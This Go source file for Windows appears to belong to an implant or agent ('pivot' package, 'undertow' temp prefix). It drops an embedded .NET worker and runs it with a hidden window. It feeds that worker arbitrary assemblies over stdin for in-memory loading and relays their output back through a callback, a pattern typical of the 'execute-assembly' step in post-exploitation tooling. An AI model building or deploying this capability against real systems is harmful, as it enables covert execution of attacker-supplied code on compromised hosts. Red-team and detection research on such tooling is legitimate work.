//go:build windows && amd64

package pivot

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

//go:embed assemblyworker/worker.exe
var assemblyWorker []byte

// The dedicated .NET Framework worker is embedded in the agent binary. Only
// this fixed worker executable is materialized for CreateProcess; the module
// itself is sent over stdin and loaded by the CLR from bytes.
func assemblyWorkerPath() (string, func(), error) {
	directory, err := os.MkdirTemp("", "undertow-clr-")
	if err != nil {
		return "", nil, fmt.Errorf("create assembly worker directory: %w", err)
	}
	cleanup := func() { _ = os.RemoveAll(directory) }
	path := filepath.Join(directory, "worker.exe")
	if err := os.WriteFile(path, assemblyWorker, 0700); err != nil {
		cleanup()
		return "", nil, fmt.Errorf("write assembly worker: %w", err)
	}
	return path, cleanup, nil
}

func assemblyWorkerRequest(source []byte, args []string) []byte {
	request := bytes.NewBuffer(make([]byte, 0, 12+len(source)+4096))
	request.WriteString("UTA1")
	_ = binary.Write(request, binary.LittleEndian, uint32(len(args)))
	for _, arg := range args {
		_ = binary.Write(request, binary.LittleEndian, uint32(len(arg)))
		request.WriteString(arg)
	}
	_ = binary.Write(request, binary.LittleEndian, uint32(len(source)))
	request.Write(source)
	return request.Bytes()
}

type assemblyOutput struct {
	kind      byte
	write     func(byte, []byte) error
	remaining *atomic.Int64
}

func (o assemblyOutput) Write(data []byte) (int, error) {
	total := len(data)
	if o.remaining.Add(-int64(total)) < 0 {
		return 0, errors.New("assembly output exceeded 4 MiB")
	}
	for len(data) > 0 {
		n := len(data)
		if n > 8<<10 {
			n = 8 << 10
		}
		if err := o.write(o.kind, data[:n]); err != nil {
			return total - len(data), err
		}
		data = data[n:]
	}
	return total, nil
}

func executeAssembly(ctx context.Context, source []byte, args []string, write func(byte, []byte) error) (int, error) {
	path, cleanup, err := assemblyWorkerPath()
	if err != nil {
		return -1, err
	}
	defer cleanup()

	command := exec.CommandContext(ctx, path)
	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	command.Stdin = bytes.NewReader(assemblyWorkerRequest(source, args))
	stdout, err := command.StdoutPipe()
	if err != nil {
		return -1, err
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		return -1, err
	}
	if err := command.Start(); err != nil {
		return -1, fmt.Errorf("start .NET Framework worker: %w", err)
	}
	var remaining atomic.Int64
	remaining.Store(4 << 20)
	var firstErr error
	var mu sync.Mutex
	var group sync.WaitGroup
	for _, pipe := range []struct {
		reader io.Reader
		kind   byte
	}{{stdout, InteractiveOutput}, {stderr, InteractiveStderr}} {
		group.Add(1)
		go func(reader io.Reader, kind byte) {
			defer group.Done()
			_, copyErr := io.Copy(assemblyOutput{kind: kind, write: write, remaining: &remaining}, reader)
			if copyErr != nil {
				mu.Lock()
				if firstErr == nil {
					firstErr = copyErr
				}
				mu.Unlock()
				_ = command.Process.Kill()
			}
		}(pipe.reader, pipe.kind)
	}
	done := make(chan error, 1)
	go func() { group.Wait(); done <- command.Wait() }()
	var waitErr error
	select {
	case <-ctx.Done():
		_ = command.Process.Kill()
		select {
		case <-done:
		case <-time.After(5 * time.Second):
		}
		return -1, ctx.Err()
	case waitErr = <-done:
	}
	if firstErr != nil {
		return -1, firstErr
	}
	if waitErr != nil {
		var exitErr *exec.ExitError
		if errors.As(waitErr, &exitErr) {
			return exitErr.ExitCode(), fmt.Errorf("assembly returned non-zero status %d", exitErr.ExitCode())
		}
		return -1, fmt.Errorf(".NET Framework worker: %w", waitErr)
	}
	return 0, nil
}
